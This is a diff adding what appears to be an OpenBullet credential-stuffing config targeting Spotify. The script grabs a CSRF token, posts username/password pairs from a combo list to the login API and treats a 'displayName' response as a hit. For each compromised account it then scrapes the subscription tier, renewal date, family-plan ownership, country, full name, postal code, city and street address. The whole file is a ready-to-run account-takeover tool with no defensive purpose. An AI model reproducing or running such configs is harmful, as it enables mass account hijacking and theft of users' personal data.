@@ -1,0 +1,137 @@
+[SETTINGS]
+{
+  "Name": "Spotify-matt",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-23T20:59:44.7160821+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" EncodeContent=TRUE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<COOKIES(csrf_token)>" LR "" "" -> VAR "CSRF" 
+
+#Login REQUEST POST "https://accounts.spotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "displayName" 
+  KEYCHAIN Failure OR 
+    KEY "errorInvalidCredentials" 
+
+#Capture REQUEST GET "https://www.spotify.com/us/account/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Subscription PARSE "<SOURCE>" LR "\":{\"name\":\"" "\",\"" -> CAP "Subscription" 
+
+#isFamilyMember PARSE "<SOURCE>" LR "\":{\"note\":\"" "plan.\"},\"" -> VAR "Family Member" 
+
+#replaceMemberWithYes FUNCTION Replace "You\\u2019re a member of a Family" "Yes" "<Family Member>" -> CAP "Family Member" 
+
+#Capture REQUEST GET "https://www.spotify.com/us/account/subscription/change/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Renew PARSE "<SOURCE>" LR "=\"recurring-date\">" "</b>" -> CAP "Renew" 
+
+#isFamilyOwner PARSE "<SOURCE>" LR "?target=premium\">Remove family" "/a>" -> VAR "Family Owner" 
+
+#replaceOwnerWithYes FUNCTION Replace "<" "Yes" "<Family Owner>" -> CAP "Family Owner" 
+
+#Capture REQUEST GET "https://www.spotify.com/us/account/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Country PARSE "<SOURCE>" LR "label\":\"Country\",\"value\":\"" "\"}]," -> VAR "Country" "" "Country" 
+
+#deleteCountry FUNCTION Replace "Country" "" "<Country>" -> CAP "Country" 
+
+#Capture REQUEST GET "https://www.spotify.com/us/family/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#GetFullData PARSE "<SOURCE>" LR "familyPlanData: \"" "};" CreateEmpty=FALSE -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x7B" "<" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x20" " " "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x22" "\"" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x3A" ":" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x2D" "-" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x5D" ")" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x5B" "(" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x7D" ">" "<FullFamily>" -> VAR "FullFamily" 
+
+#canAddOwnAddress PARSE "<FullFamily>" LR ",\"needsAddressCollected\":" "," -> CAP "CanAddOwnAddress" 
+
+#PostalCode PARSE "<FullFamily>" LR "\"postalCode\":\"" "\",\"" -> CAP "ZipCode" 
+
+#City PARSE "<FullFamily>" LR "\",\"city\":\"" "\",\"line1\":\"" -> CAP "City" 
+
+#Address PARSE "<FullFamily>" LR "\",\"line1\":\"" "\">,\"" -> CAP "Address" 
+
+#Name PARSE "<FullFamily>" LR ",\"fullName\":" ">,\"" -> VAR "Name" 
+
+#FixName FUNCTION Replace "null" " " "<Name>" -> CAP "Name" 
+
+#CanInvite PARSE "<FullFamily>" LR "canInvite\":" ",\"" -> CAP "CanInvite" 
+
+#accCategory KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<<Subscription>" Contains "Spotify Free" 
+  KEYCHAIN Success OR 
+    KEY "<Subscription>" Contains "Student" 
+    KEY "<Subscription>" Contains "Premium for Family" 
+    KEY "<Subscription>" Contains "Premium" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Family Owner>" Contains "Yes" 
+    KEY "<Renew>" DoesNotExist 
+
